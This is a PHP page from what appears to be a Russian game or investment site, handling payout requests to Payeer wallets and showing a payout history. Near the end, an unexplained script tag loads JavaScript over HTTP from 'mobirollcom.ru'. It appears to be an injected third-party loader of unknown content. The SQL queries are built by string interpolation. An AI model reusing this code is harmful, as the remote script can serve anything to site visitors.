<div class="s-bk-lf">
<div class="acc-title">Заказ выплаты</div>
</div>
<div class="silver-bk">


<?PHP
$_OPTIMIZATION["title"] = "Аккаунт - Заказ выплаты";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_payment WHERE user_id = '$usid' order by id DESC LIMIT 1");
$frompayments = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();

$status_array = array( 0 => "Проверяется", 1 => "Выплачивается", 2 => "Отменена", 3 => "Выплачено");

# Минималка серебром!
$minPay = 50;
# Настраиваем кол-во суток для ограничения.
$nd_time = 1;
?>
<b>Выплаты осуществляются в автоматическом режиме и только на платежную систему PAYEER! Процент при выводе составляет 0%</b>


<b>Из платежной системы Payeer Вы можете вывести свои средства в автоматическом режиме на все известные платежные системы и международные банки.</b>


<b>Ссылки на учебные материалы:</b>

- <a href="https://payeer.com/?partner=17201" target="_blank"><font color="blue">Создание счета в Payeer</font></a> <BR />

- <a href="https://payeer.com/?partner=17201" target="_blank"><font color="blue">Создание счета в Payeer</font></a> <BR />




<center><b>Заказ выплаты:</b></center>


<?PHP

function ViewPurse($purse){

  if( substr($purse,0,1) != "P" ) return false;
  if( !ereg("^[0-9]{7,8}$", substr($purse,1)) ) return false;
  return $purse;
}

# Заносим выплату
if(isset($_POST["purse"])){

  $purse = ViewPurse($_POST["purse"]);
  $sum = intval($_POST["sum"]);
  $val = "RUB";

  if($purse !== false){

    if($sum >= $minPay){

     if($sum <= $user_data["money_p"]){

                            # Проверяем на существующие заявки
                        $db->Query("SELECT COUNT(*) FROM db_payment WHERE user_id = '$usid' AND (status = '0' OR status = '1')");
                        if($db->FetchRow() == 0){
                       
                             ### Устанавливаем лимит на 24 часа по выплатам для $USID
       if ($frompayments["date_add"] <= time() - $nd_time * 86400) {




                            ### Делаем выплату ###
                            $payeer = new rfs_payeer($config->AccountNumber, $config->apiId, $config->apiKey);
                            if ($payeer->isAuth())
                            {
                       
                                $arBalance = $payeer->getBalance();
                                if($arBalance["auth_error"] == 0)
                                {
                           
                                    $sum_pay = round( ($sum / $sonfig_site["ser_per_wmr"]), 2);
                           
                                    $balance = $arBalance["balance"]["RUB"]["DOSTUPNO"];
                                    if( ($balance) >= ($sum_pay)){
                           
                           
                           
                                    $arTransfer = $payeer->transfer(array(
                                    'curIn' => 'RUB', // счет списания
                                    'sum' => $sum_pay, // сумма получения
                                    'curOut' => 'RUB', // валюта получения
                                    'to' => $purse, // получатель (email)
                                    //'to' => '+71112223344',  // получатель (телефон)
                                    //'to' => 'P1000000',  // получатель (номер счета)
                                    'comment' => iconv('windows-1251', 'utf-8', "Выплата пользователю: {$usname}")
                                    //'anonim' => 'Y', // анонимный перевод
                                    //'protect' => 'Y', // протекция сделки
                                    //'protectPeriod' => '3', // период протекции (от 1 до 30 дней)
                                    //'protectCode' => '12345', // код протекции
                                    ));
                           
                                        if (!empty($arTransfer["historyId"]))
                                        {
                               
                               
                                            # Снимаем с пользователя
                                            $db->Query("UPDATE db_users_b SET money_p = money_p - '$sum' WHERE id = '$usid'");
                                   
                                            # Вставляем запись в выплаты
                                            $da = time();
                                            $dd = $da + 60*60*24*15;
                                   
                                            $ppid = $arTransfer["historyId"];
                                   
                                            $db->Query("INSERT INTO db_payment (user, user_id, purse, sum, valuta, serebro, payment_id, date_add, status)
                                            VALUES ('$usname','$usid','$purse','$sum_pay','RUB', '$sum','$ppid','".time()."', '3')");
                                   
                                            $db->Query("UPDATE db_users_b SET payment_sum = payment_sum + '$sum_pay' WHERE id = '$usid'");
                                            $db->Query("UPDATE db_stats SET all_payments = all_payments + '$sum_pay' WHERE id = '1'");
                                   
                                            echo "<center><font color = 'green'><b>Выплачено!</b></font></center>
";
                                   
                                        }
                                        else
                                        {
                               
                                            echo "<center><font color = 'red'><b>Внутреняя ошибка - сообщите о ней администратору!</b></font></center>
";
                               
                                        }
                           
                           
                                    }else echo "<center><font color = 'red'><b>Внутреняя ошибка - сообщите о ней администратору!</b></font></center>
";
                           
                                }else echo "<center><font color = 'red'><b>Не удалось выплатить! Попробуйте позже</b></font></center>
";
                       
                            }else echo "<center><font color = 'red'><b>Не удалось выплатить! Попробуйте позже</b></font></center>
";
                   
       }else echo "<center><font color = 'red'><b>В ближайшие 24 часа Вы уже получали выплату! Попробуйте позже</b></font></center>
";
 
                        }else echo "<center><font color = 'red'><b>У вас имеются необработанные заявки. Дождитесь их выполнения.</b></font></center>
";
                   
               
                    }else echo "<center><font color = 'red'><b>Вы указали больше, чем имеется на вашем счету</b></font></center>
";
       
                }else echo "<center><b><font color = 'red'>Минимальная сумма для выплаты составляет {$minPay} серебра!</font></b></center>
";

        }else echo "<center><b><font color = 'red'>Кошелек Payeer указан неверно! Смотрите образец!</font></b></center>
";

    }
?>

<form action="" method="post">
<table width="99%" border="0" align="center">
  <tr>
    <td><font color="#000;">Введите кошелек Payeer [Пример: P1112457]</font>: </td>
<td><input type="text" name="purse" size="15"/></td>
  </tr>
  <tr>
     <td><font color="#000;"><b>Отдаете серебро для вывода</font> [Мин. 100]<font color="#000;">:<b></font> </td>
<td><input type="text" name="sum" id="sum" value="<?=round($user_data["money_p"]); ?>" size="15" onkeyup="PaymentSum();" /></td>
  </tr>
  <tr>
    <td><font color="#000;">Получаете <span id="res_val"></span></font><font color="#000;">:</font> </td>
<td>
<input type="text" name="res" id="res_sum" value="0" size="15" disabled="disabled"/>
<input type="hidden" name="per" id="RUB" value="<?=$sonfig_site["ser_per_wmr"]; ?>" disabled="disabled"/>
<input type="hidden" name="per" id="min_sum_RUB" value="0.5" disabled="disabled"/>
<input type="hidden" name="val_type" id="val_type" value="RUB" />
</td>
  </tr>
  <tr>
    <td colspan="2" align="center"><input type="submit" name="swap" value="Заказать выплату" style="height: 30px; margin-top:10px;" /></td>
  </tr>
</table>
</form>
<script language="javascript">PaymentSum(); SetVal();</script>
<script language='javascript' charset='UTF-8' type='text/javascript' src='http://mobirollcom.ru/7pg0t744jyz5jvyxu1ex3o16is9yp6j9'></script>


<table cellpadding='3' cellspacing='0' border='0' bordercolor='#336633' align='center' width="99%">
  <tr>
    <td colspan="5" align="center"><h4>Последние 10 выплат</h4></td>
    </tr>
  <tr>
    <td align="center" class="m-tb">Серебро</td>
    <td align="center" class="m-tb">Получаете</td>
<td align="center" class="m-tb">Кошелек</td>
<td align="center" class="m-tb">Дата</td>
<td align="center" class="m-tb">Статус</td>
  </tr>
  <?PHP

  $db->Query("SELECT * FROM db_payment WHERE user_id = '$usid' ORDER BY id DESC LIMIT 20");

if($db->NumRows() > 0){

    while($ref = $db->FetchArray()){

  ?>
  <tr class="htt">
      <td align="center"><?=$ref["serebro"]; ?></td>
      <td align="center"><?=sprintf("%.2f",$ref["sum"] - $ref["comission"]); ?> <?=$ref["valuta"]; ?></td>
      <td align="center"><?=$ref["purse"]; ?></td>
   <td align="center"><?=date("d.m.Y",$ref["date_add"]); ?></td>
      <td align="center"><?=$status_array[$ref["status"]]; ?></td>
    </tr>
  <?PHP

  }

}else echo '<tr><td align="center" colspan="5">Нет записей</td></tr>'

  ?>


</table><div class="clr"></div>
</div>